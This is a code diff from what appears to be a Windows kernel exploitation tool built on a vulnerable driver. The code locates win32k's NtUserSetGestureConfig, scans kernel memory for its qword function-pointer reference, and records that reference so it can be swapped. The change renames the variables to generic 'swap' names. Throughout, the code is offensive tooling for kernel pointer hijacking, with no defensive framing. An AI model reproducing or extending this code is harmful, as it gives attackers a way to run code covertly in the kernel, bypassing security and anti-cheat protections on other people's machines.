@@ -51,12 +51,12 @@ bool PreInit(const wchar_t* vuln_driver_path, const wchar_t* vuln_driver_name, D
 	}
 	log_info("win32k path: %s", win32k_path);
 
-	int NtUserSetGestureConfig_rva = EzPdbGetRva(win32k_path, "NtUserSetGestureConfig");
-	if (NtUserSetGestureConfig_rva <= 0) {
-		log_error("failed get NtUserSetGestureConfig_rva");
+	int swap_rva = EzPdbGetRva(win32k_path, "NtUserSetGestureConfig");
+	if (swap_rva <= 0) {
+		log_error("failed get swap_rva");
 		return false;
 	}
-	log_info("NtUserSetGestureConfig_rva: %d", NtUserSetGestureConfig_rva);
+	log_info("swap_rva: %d", swap_rva);
 
 	HMODULE u32mod = LoadLibraryA("user32.dll");
 	HMODULE w32mod = LoadLibraryA("win32u.dll");
@@ -73,21 +73,21 @@ bool PreInit(const wchar_t* vuln_driver_path, const wchar_t* vuln_driver_name, D
 
 	log_info("win32k base: %p", win32k);
 
-	uintptr_t NtUserSetGestureConfig_u = GetProcAddress(w32mod, "NtUserSetGestureConfig");
-	if (!NtUserSetGestureConfig_u) {
-		log_error("failed to get GetProcAddress NtUserSetGestureConfig_u");
+	uintptr_t swap_u = GetProcAddress(w32mod, "NtUserSetGestureConfig");
+	if (!swap_u) {
+		log_error("failed to get GetProcAddress swap_u");
 		return false;
 	}
 
-	driverState->win32k_base = win32k;
-	driverState->NtUserSetGestureConfig_rva = NtUserSetGestureConfig_rva;
-	driverState->NtUserSetGestureConfig_u = NtUserSetGestureConfig_u;
+	driverState->swap_module_base = win32k;
+	driverState->swap_rva = swap_rva;
+	driverState->swap_u = swap_u;
 	*driverState_out = driverState;
 	return true;
 }
 
 bool TryUpdateNtRef(DriverState* driverState) {
-	uintptr_t NtUserSetGestureConfig = driverState->win32k_base + driverState->NtUserSetGestureConfig_rva;
+	uintptr_t NtUserSetGestureConfig = driverState->swap_module_base + driverState->swap_rva;
 
 	uintptr_t nt_qword = FindPatternAtKernel(driverState, NtUserSetGestureConfig, 0x100, "\x48\x8B\x05", "xxx");
 	if (!nt_qword) {
@@ -103,9 +103,9 @@ bool TryUpdateNtRef(DriverState* driverState) {
 	}
 	log_info("ref offset: %d", nt_qword_offset);
 
-	uintptr_t NtUserSetGestureConfig_ref = nt_qword + nt_qword_offset + 7;
-	log_info("NtUserSetGestureConfig_ref: %p", NtUserSetGestureConfig_ref);
-	driverState->NtUserSetGestureConfig_ref = NtUserSetGestureConfig_ref;
+	uintptr_t swap_ref = nt_qword + nt_qword_offset + 7;
+	log_info("swap_ref: %p", swap_ref);
+	driverState->swap_ref = swap_ref;
 	return true;
 }
 
